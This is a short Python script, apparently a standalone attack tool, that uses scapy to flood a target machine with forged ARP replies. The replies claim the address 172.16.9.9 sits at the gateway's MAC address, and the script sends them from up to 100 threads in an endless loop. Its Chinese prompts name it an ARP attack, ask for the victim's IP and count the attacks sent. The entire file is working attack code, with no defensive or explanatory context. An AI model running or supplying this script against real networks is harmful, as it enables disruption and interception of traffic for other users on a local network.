# -*- coding: cp936 -*-
from scapy.all import *
from threading import Thread, Lock, activeCount

BROADCASTMAC = getmacbyip('172.16.9.1')


class Loop(Thread):
    def __init__(self, ip):
        Thread.__init__(self)
        self.ip = ip

    def run(self):
        global BROADCASTMAC
        arp = ARP()
        arp.psrc = '172.16.9.9'
        arp.hwsrc = BROADCASTMAC
        arp.pdst = self.ip
        arp.op = 2
        sr1(arp, verbose=0, retry=0, timeout=3)


class Main(Thread):
    def __init__(self, ip):
        Thread.__init__(self)
        self.ip = ip

    def run(self):
        limit = 100
        total = 0
        while True:
            if activeCount() < limit:
                Loop(self.ip).start()
                total = total + 1
            print('目前已进行了ARP攻击的次数为:' + str(total))


if __name__ == '__main__':
    ip = input('请输入要进行ARP攻击的机器IP:') #172.16.9.238

    Main(ip=ip).start()
